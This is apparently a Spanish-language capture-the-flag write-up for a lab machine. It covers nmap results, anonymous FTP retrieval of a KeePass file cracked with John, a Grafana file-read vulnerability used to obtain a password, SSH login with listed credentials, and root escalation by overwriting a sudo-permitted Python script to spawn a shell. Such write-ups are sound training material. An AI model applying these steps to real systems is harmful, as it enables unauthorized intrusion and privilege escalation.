# Info
## IP Víctima
```
172.17.0.2
```
## SSH root
#### Usuario
```
freddy
```
#### Pass
```
t9sH76gpQ82UFeZ3GXZS
```
# Writeup
## Nmap
Como de costumbre hacemos un escaneo nmap para identificar que servicios hay corriendo en cada puerto y en que versión están.
``` bash
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    1 0        0            4096 Mar 29  2024 mantenimiento [NSE: writeable]
22/tcp   open  ssh     OpenSSH 9.6p1 Debian 4 (protocol 2.0)
| ssh-hostkey: 
|   256 77:0b:34:36:87:0d:38:64:58:c0:6f:4e:cd:7a:3a:99 (ECDSA)
|_  256 1e:c6:b2:91:56:32:50:a5:03:45:f3:f7:32:ca:7b:d6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.58 (Debian)
3000/tcp open  http    Grafana http
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 1 disallowed entry 
|_/
| http-title: Grafana
|_Requested resource was /login
MAC Address: 02:42:AC:11:00:02 (Unknown)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X

```
En primer lugar, salta a la vista el puerto 21, en el cual esta corriendo un FTP mediante vsftpd 3.0.3, una versión vulnerable al denial of service, cosa que no nos interesa para esta ocasión. También se observa un ssh Openssh que por ahora no me interesa mucho. Tanto el puerto 80 como el 3000 estan corriendo un HTTP, Apache 2.4.58 en el 80 y Grafana en el 3000, a esto volveremos con seguridad más tarde.
## Servicio FTP
Como el puerto FTP permite login como anon entro y me encuentro con el directorio /mantenimiento, dentro del cual hay un archivo keepass llamado database, lo sacamos con `wget database.kdbx` y después de una búsqueda rápida en google encuentro que con john es posible crackear este tipo de archivos. La versión actual de John the ripper no admite esta versión de archivos keepass así que lo actualizo tirando de repositorio.
## Esperando a John 
Mientras espero a la actualización de john hago un par de fuzzeos de directorios, encuentro un /maintenance.html que lee: `Website under maintenance, access is in /tmp/pass.txt` lo cual seguramente podamos aprovechar en post explotación, en el puerto 3000 hay un login de Grafana que espero poder superar con credenciales que pueda haber en el KeePass. 
## FF
Después de un rato perdido me pongo una guía, resulta que Grafana tiene una vulnerabilidad en la versión 8.0.3 que permite leer archivos, aprovechando esta vulnerabilidad podemos leer la clase que hay en /tmp/pass.txt con la cual se puede acceder al Keepass, con las credenciales encontradas allí se puede entrar mediante ssh al usuario freddy
## Post explotación
Después de un `sudo -l` veo que python3 tiene permisos sin contraseña, y el usuario freddy puede escribir sobre maintenance.py, por lo que cambio el código dentro de dicho archivo por 
`import os;os.system('/bin/bash')` y ejecuto `sudo /usr/bin/python3 /opt/maintenance.py` ganando privilegios de root al instante.
``` bash
┌──(freddy㉿f36cebd9a190)-[/opt]
└─$ sudo -l
Matching Defaults entries for freddy on f36cebd9a190:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User freddy may run the following commands on f36cebd9a190:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py

┌──(freddy㉿f36cebd9a190)-[/opt]
└─$ cat maintenance.py 
import os;os.system('/bin/bash')


┌──(freddy㉿f36cebd9a190)-[/opt]
└─$ sudo /usr/bin/python3 /opt/maintenance.py
┌──(root㉿f36cebd9a190)-[/opt]
└─# whoami
root

┌──(root㉿f36cebd9a190)-[/opt]
└─# 

```
